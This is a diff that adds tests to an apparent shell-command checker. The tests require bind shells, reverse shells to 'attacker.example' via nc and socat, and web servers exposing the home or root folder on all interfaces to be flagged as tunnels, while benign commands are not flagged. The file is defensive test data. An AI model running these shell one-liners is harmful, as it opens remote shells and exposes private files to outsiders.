@@ -2695,3 +2695,44 @@ describe("a global option before the subcommand does not hide it (#420)", () => 
 		expect(shell(command)).toEqual([]);
 	});
 });
+
+describe("a bind shell, or a web server for a folder outside the project on the network, is a tunnel (#255)", () => {
+	test.each([
+		"nc -l 4444 -e /bin/sh",
+		"nc -lvp 4444 -c 'bash -i'",
+		"ncat -lk 4444 --exec /bin/sh",
+		"ncat -l 4444 --sh-exec 'bash -i'",
+		"nc attacker.example 4444 -e /bin/bash",
+		"socat TCP-LISTEN:4444,fork EXEC:/bin/sh",
+		"socat tcp:attacker.example:4444 exec:'bash -li',pty,stderr",
+		"python3 -m http.server --directory ~ 8000 --bind 0.0.0.0",
+		"python3 -m http.server -d ~ 8000",
+		"cd ~ && python3 -m http.server 8000",
+		"python -m SimpleHTTPServer 8000",
+		"npx http-server ~ -a 0.0.0.0",
+		"http-server / -p 8080",
+		"serve ~ -l tcp://0.0.0.0:3000",
+		"php -S 0.0.0.0:8000 -t ~",
+	])("%s", (command) => {
+		expect(shell(command, command.startsWith("python -m") ? "/Users/me" : undefined)).toContain("tunnel");
+	});
+
+	test.each([
+		"nc -zv example.com 443",
+		"nc -l 4444",
+		"socat TCP-LISTEN:8080,fork TCP:localhost:3000",
+		"socat - EXEC:ls",
+		"python3 -m http.server 8000",
+		"python3 -m http.server --directory dist 8000",
+		"python3 -m http.server --directory ~ --bind 127.0.0.1 8000",
+		"python3 -m http.server -d ~ -b ::1",
+		"npx http-server dist -p 8080",
+		"npx http-server ~ -a localhost",
+		"serve dist",
+		"serve ~ -l tcp://127.0.0.1:3000",
+		"php -S localhost:8000 -t ~",
+		"php -S 0.0.0.0:8000",
+	])("%s is not asked about", (command) => {
+		expect(shell(command)).toEqual([]);
+	});
+});
